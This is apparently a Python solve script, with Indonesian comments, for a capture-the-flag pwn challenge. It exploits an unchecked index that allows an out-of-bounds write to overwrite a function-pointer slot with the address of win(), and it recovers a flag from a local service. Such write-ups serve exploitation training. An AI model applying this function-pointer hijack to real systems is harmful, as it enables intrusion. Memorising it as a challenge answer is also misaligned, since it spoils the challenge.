#!/usr/bin/env python3
"""
Solve script untuk pwn_furina.

Bug: menu "1" (Catat catatan kasus) menulis ke `court[idx*32 .. idx*32+len)`
     TANPA validasi `idx` -> idx bebas diarahkan ke slot function pointer
     `court[16..19]` yang dipakai menu "2" (Jatuhkan putusan) untuk
     `court_slot(a, b, c)`.

Exploit: timpa salah satu slot function pointer itu dengan alamat win(),
lalu panggil slot tersebut dengan argumen yang dicek win()
(a=0x1337, b=0xc0de, c=0xf00dbeef) -> win() mencetak flag.

Tidak butuh bypass canary/PIE/ASLR karena ini bukan stack overflow biasa,
melainkan OOB write pada array global yang dobel-fungsi sebagai jump table
(dan binary-nya non-PIE, jadi alamat win() tetap/fixed).
"""
import socket
import struct
import sys

HOST = "localhost"
PORT = 40301

WIN_ADDR = 0x4012e3   # alamat fungsi win() (non-PIE -> fixed)

# idx*32 harus == (0+16)*8 == 128 agar menimpa court[16] (slot yang dipanggil saat idx2=0)
WRITE_IDX = 4          # 4*32 = 128
CALL_IDX = 0           # (0+16)*8 = 128 -> slot yang sama


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    def send(data: bytes):
        s.sendall(data)

    # 1) Tulis alamat win() ke slot function pointer court[16] lewat bug OOB-write
    send(b"1\n")
    send(f"{WRITE_IDX}\n".encode())
    send(b"8\n")                           # panjang = 8 byte (satu alamat 64-bit)
    send(struct.pack("<Q", WIN_ADDR))      # isi: alamat win() little-endian

    # 2) Panggil slot yang baru ditimpa dengan argumen yang dicek win()
    send(b"2\n")
    send(f"{CALL_IDX}\n".encode())
    send(b"0x1337\n")
    send(b"0xc0de\n")
    send(b"0xf00dbeef\n")

    # 3) keluar (opsional)
    send(b"3\n")

    s.settimeout(3)
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass

    text = out.decode(errors="replace")
    print(text)

    for line in text.splitlines():
        if "TecFest26{" in line:
            print("[FLAG] " + line, file=sys.stderr)

    s.close()


if __name__ == "__main__":
    main()
